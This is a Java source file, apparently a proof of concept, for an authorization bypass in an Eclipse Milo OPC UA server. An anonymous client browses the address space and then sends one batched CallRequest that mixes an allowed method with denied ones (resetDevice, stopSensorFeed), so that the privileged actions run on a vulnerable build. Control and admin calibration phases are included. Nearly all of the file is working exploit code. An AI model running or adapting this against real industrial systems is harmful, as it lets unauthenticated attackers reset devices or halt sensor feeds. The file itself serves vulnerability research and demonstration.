/*
 * the mixed-batch bypass PoC: attacker + calibration-admin client.
 *
 * A genuine, unmodified Milo OPC UA client (milo-sdk-client). The attacker phases never use any
 * privileged shortcut: they connect ANONYMOUSLY (SecurityPolicy.None), Browse the address space
 * to discover the target NodeIds (exactly what an unauthenticated attacker can legitimately do),
 * and issue normal Call service requests.
 *
 * Phases (args[1]):
 *   calibration      -- AUTHENTICATED Admin (username/password "admin"/"password2") calls
 *                        resetDevice() DIRECTLY. Establishes the method's real, intended
 *                        operational effect, independent of the bug.
 *   control-denied   -- anonymous attacker calls resetDevice() ALONE. Expect Bad_UserAccessDenied
 *                        and zero server-side side effect -- proves authorization normally works.
 *   mixed-batch      -- anonymous attacker sends ONE CallRequest batching
 *                        [readStatus (allowed), resetDevice (denied)]. On the vulnerable build
 *                        this is expected to execute resetDevice() anyway (the bypass). The
 *                        client-visible wire outcome is reported EXACTLY as observed -- it may be
 *                        a clean CallResponse or an exceptional completion (e.g. Bad_Timeout) --
 *                        never assumed.
 *   mixed-batch-rev  -- identical to mixed-batch, but REVERSED: [resetDevice (denied), readStatus
 *                        (allowed)]. Proves the bypass does not depend on the denied method
 *                        being listed after the allowed one.
 *
 *   calibration-stopfeed    -- AUTHENTICATED Admin calls stopSensorFeed() DIRECTLY. Expect Good.
 *                              Establishes stopSensorFeed's real, intended effect (permanently
 *                              kills the live SensorFeed tick) independent of the bug.
 *   control-stopfeed-denied -- anonymous attacker calls stopSensorFeed() ALONE. Expect
 *                              Bad_UserAccessDenied, counter unchanged, feed keeps ticking.
 *   mixed-batch-stopfeed    -- anonymous attacker sends ONE CallRequest batching
 *                              [readStatus (allowed), stopSensorFeed (denied)]. Wire outcome
 *                              reported exactly as observed, same honesty rule as mixed-batch.
 *   mixed-batch-stopfeed-rev -- identical to mixed-batch-stopfeed, but REVERSED: [stopSensorFeed
 *                              (denied), readStatus (allowed)].
 *
 * Each phase opens a brand-new session. Request timeout is kept short (5s) so the run never
 * hangs, whichever way the mixed-batch call resolves.
 */
package callbatch;

import java.util.List;
import java.util.Optional;
import java.util.function.Predicate;
import org.eclipse.milo.opcua.sdk.client.OpcUaClient;
import org.eclipse.milo.opcua.sdk.client.identity.AnonymousProvider;
import org.eclipse.milo.opcua.sdk.client.identity.IdentityProvider;
import org.eclipse.milo.opcua.sdk.client.identity.UsernameProvider;
import org.eclipse.milo.opcua.stack.core.security.SecurityPolicy;
import org.eclipse.milo.opcua.stack.core.types.builtin.ExpandedNodeId;
import org.eclipse.milo.opcua.stack.core.types.builtin.NodeId;
import org.eclipse.milo.opcua.stack.core.types.builtin.QualifiedName;
import org.eclipse.milo.opcua.stack.core.types.builtin.Variant;
import org.eclipse.milo.opcua.stack.core.types.builtin.unsigned.Unsigned;
import org.eclipse.milo.opcua.stack.core.types.enumerated.UserTokenType;
import org.eclipse.milo.opcua.stack.core.types.structured.CallMethodRequest;
import org.eclipse.milo.opcua.stack.core.types.structured.CallMethodResult;
import org.eclipse.milo.opcua.stack.core.types.structured.CallResponse;
import org.eclipse.milo.opcua.stack.core.types.structured.EndpointDescription;
import org.eclipse.milo.opcua.stack.core.types.structured.ReferenceDescription;

public class Attacker {

  public static void main(String[] args) throws Exception {
    String url = args.length > 0 ? args[0] : "opc.tcp://localhost:12686/milo";
    String phase = args.length > 1 ? args[1] : "control-denied";

    boolean asAdmin = "calibration".equals(phase) || "calibration-stopfeed".equals(phase);

    System.out.println(
        "CLIENT phase="
            + phase
            + " url="
            + url
            + " identity="
            + (asAdmin ? "admin/UserName" : "anonymous"));
    System.out.flush();

    OpcUaClient client = createClient(url, asAdmin);
    try {
      client.connect();
      System.out.println(
          "CLIENT connected ("
              + (asAdmin ? "AUTHENTICATED as admin" : "anonymous")
              + ", SecurityPolicy.None)");

      // Discovery via Browse -- unauthenticated attackers can legitimately do this too.
      NodeId plantId =
          browseChild(client, org.eclipse.milo.opcua.stack.core.NodeIds.ObjectsFolder, "Plant");
      NodeId deviceId = browseChild(client, plantId, "Device");
      NodeId readStatusId = browseChild(client, deviceId, "readStatus");
      NodeId resetDeviceId = browseChild(client, deviceId, "resetDevice");
      NodeId sensorFeedId = browseChild(client, plantId, "SensorFeed");
      NodeId stopSensorFeedId = browseChild(client, sensorFeedId, "stopSensorFeed");

      System.out.println(
          "CLIENT discovered nodes via Browse: Device="
              + deviceId
              + " readStatus="
              + readStatusId
              + " resetDevice="
              + resetDeviceId
              + " SensorFeed="
              + sensorFeedId
              + " stopSensorFeed="
              + stopSensorFeedId);

      switch (phase) {
        case "calibration" -> {
          System.out.println(
              "CALIBRATION: AUTHENTICATED Admin calls resetDevice() DIRECTLY (expect Good --"
                  + " establishes the method's real, intended effect)");
          callAndReport(client, deviceId, resetDeviceId);
        }
        case "control-denied" -> {
          System.out.println(
              "CONTROL A (denied-alone): anonymous attacker calls resetDevice() ALONE (expect"
                  + " Bad_UserAccessDenied)");
          callAndReport(client, deviceId, resetDeviceId);
        }
        case "mixed-batch" -> {
          System.out.println(
              "ATTACK (mixed batch): anonymous attacker sends ONE CallRequest ["
                  + "readStatus (allowed), resetDevice (DENIED)]");
          callBatchAndReport(
              client,
              List.of(
                  new CallMethodRequest(deviceId, readStatusId, new Variant[0]),
                  new CallMethodRequest(deviceId, resetDeviceId, new Variant[0])));
        }
        case "mixed-batch-rev" -> {
          System.out.println(
              "ATTACK (mixed batch, REVERSED order): anonymous attacker sends ONE CallRequest ["
                  + "resetDevice (DENIED), readStatus (allowed)]");
          callBatchAndReport(
              client,
              List.of(
                  new CallMethodRequest(deviceId, resetDeviceId, new Variant[0]),
                  new CallMethodRequest(deviceId, readStatusId, new Variant[0])));
        }
        case "calibration-stopfeed" -> {
          System.out.println(
              "CALIBRATION (SensorFeed): AUTHENTICATED Admin calls stopSensorFeed() DIRECTLY"
                  + " (expect Good -- establishes the method's real, intended effect: the live"
                  + " feed stops ticking permanently)");
          callAndReport(client, sensorFeedId, stopSensorFeedId);
        }
        case "control-stopfeed-denied" -> {
          System.out.println(
              "CONTROL (denied-alone, SensorFeed): anonymous attacker calls stopSensorFeed()"
                  + " ALONE (expect Bad_UserAccessDenied, feed keeps ticking)");
          callAndReport(client, sensorFeedId, stopSensorFeedId);
        }
        case "mixed-batch-stopfeed" -> {
          System.out.println(
              "ATTACK (mixed batch, SensorFeed): anonymous attacker sends ONE CallRequest ["
                  + "readStatus (allowed), stopSensorFeed (DENIED)]");
          callBatchAndReport(
              client,
              List.of(
                  new CallMethodRequest(deviceId, readStatusId, new Variant[0]),
                  new CallMethodRequest(sensorFeedId, stopSensorFeedId, new Variant[0])));
        }
        case "mixed-batch-stopfeed-rev" -> {
          System.out.println(
              "ATTACK (mixed batch, SensorFeed, REVERSED order): anonymous attacker sends ONE"
                  + " CallRequest [stopSensorFeed (DENIED), readStatus (allowed)]");
          callBatchAndReport(
              client,
              List.of(
                  new CallMethodRequest(sensorFeedId, stopSensorFeedId, new Variant[0]),
                  new CallMethodRequest(deviceId, readStatusId, new Variant[0])));
        }
        default -> throw new IllegalArgumentException("unknown phase: " + phase);
      }
    } catch (Throwable t) {
      System.out.println("CLIENT phase=" + phase + " ended with exception: " + t);
    } finally {
      try {
        client.disconnectAsync().get(3, java.util.concurrent.TimeUnit.SECONDS);
      } catch (Exception ignored) {
      }
    }
    System.out.println("CLIENT_DONE phase=" + phase);
    System.out.flush();
    Runtime.getRuntime().halt(0);
  }

  private static void callAndReport(OpcUaClient client, NodeId objectId, NodeId methodId) {
    try {
      CallResponse response =
          client.call(List.of(new CallMethodRequest(objectId, methodId, new Variant[0])));
      CallMethodResult result = response.getResults()[0];
      System.out.println("CLIENT call result: statusCode=" + result.getStatusCode());
    } catch (Exception e) {
      System.out.println("CLIENT call failed: " + e);
    }
  }

  private static void callBatchAndReport(OpcUaClient client, List<CallMethodRequest> batch) {
    try {
      CallResponse response = client.call(batch);
      System.out.println("CLIENT batch call returned a CallResponse (WIRE: not a timeout):");
      for (CallMethodResult r : response.getResults()) {
        System.out.println("  statusCode=" + r.getStatusCode());
      }
    } catch (Exception e) {
      // Report EXACTLY what happened on the wire -- on the vulnerable build this may be a
      // Bad_Timeout (the server-side GroupMapCollate collation can throw an uncaught
      // RuntimeException once the buggy unfiltered result-list size no longer matches the
      // filtered group size, after the denied method's side effect has already run -- so the
      // client may never receive a CallResponse at all, clean or otherwise). On the fixed build
      // this call is expected to complete normally with a clean CallResponse. Never assume
      // either outcome -- print exactly what happened.
      System.out.println("CLIENT batch call completed exceptionally -- WIRE RESULT: " + e);
    }
  }

  /** Browse {@code parent} and return the NodeId of its child with the given BrowseName. */
  private static NodeId browseChild(OpcUaClient client, NodeId parent, String browseName)
      throws Exception {
    List<ReferenceDescription> refs = client.getAddressSpace().browse(parent);
    for (ReferenceDescription ref : refs) {
      QualifiedName bn = ref.getBrowseName();
      if (bn != null && browseName.equals(bn.name())) {
        ExpandedNodeId xni = ref.getNodeId();
        return client.getAddressSpace().toNodeId(xni);
      }
    }
    throw new IllegalStateException(
        "could not find child '" + browseName + "' under " + parent + " via Browse");
  }

  /**
   * Build a client with a SHORT request timeout (5s, vs. the 60s SDK default) so the run never
   * hangs, with either an anonymous identity (the attacker, default) or the "admin"
   * username/password identity (calibration phase only).
   */
  private static OpcUaClient createClient(String url, boolean asAdmin) throws Exception {
    IdentityProvider identityProvider =
        asAdmin ? new UsernameProvider("admin", "password2") : new AnonymousProvider();

    UserTokenType wantTokenType = asAdmin ? UserTokenType.UserName : UserTokenType.Anonymous;

    Predicate<EndpointDescription> predicate =
        e ->
            SecurityPolicy.None.getUri().equals(e.getSecurityPolicyUri())
                && java.util.stream.Stream.of(
                        java.util.Objects.requireNonNullElse(
                            e.getUserIdentityTokens(),
                            new org.eclipse.milo.opcua.stack.core.types.structured
                                .UserTokenPolicy[0]))
                    .anyMatch(p -> p.getTokenType() == wantTokenType);

    return OpcUaClient.create(
        url,
        endpoints -> {
          Optional<EndpointDescription> selected = endpoints.stream().filter(predicate).findFirst();
          return selected;
        },
        transportConfig -> {},
        configBuilder -> {
          configBuilder.setIdentityProvider(identityProvider);
          configBuilder.setRequestTimeout(Unsigned.uint(5_000));
        });
  }
}
